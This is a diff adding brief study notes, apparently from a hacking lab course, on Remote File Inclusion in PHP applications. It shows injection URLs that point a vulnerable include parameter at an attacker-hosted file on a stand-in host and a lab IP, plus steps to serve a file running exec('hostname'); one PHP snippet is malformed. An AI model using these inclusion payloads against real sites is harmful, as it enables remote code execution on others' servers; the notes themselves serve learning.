@@ -1,0 +1,20 @@
+---
+title: RFI
+description:  Remote File Inclusion
+---
+
+Remote File Inclusion (RFI) is a technique to include remote files and into a vulnerable application. Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into include function. 
+
+## RFI steps
+
+Let's say that the attacker hosts a PHP file on their own server `http://attacker.thm/cmd.txt` where `cmd.txt` contains a printing message Hello World.
+```html
+<?PHPecho"Hello World";?>
+```
+First, the attacker injects the malicious URL, which points to the attacker's server, such as `http://webapp.World/index.php?lang=http://attacker.thm/cmd.txt`. If there is no input validation, then the malicious URL passes into the include function. 
+
+Next, the web app server will send a GET request to the malicious server to fetch the file. As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker. In our case, the current page somewhere has to show the Hello World message.
+	1. Start server `python3 -m http.server 8000`
+	2. New .txt file
+	3. `<?php print exec("hostname"); ?>`
+	4. `http://10.10.14.127/playground.php?file=http://10.6.57.139:8000/cmd.txt`
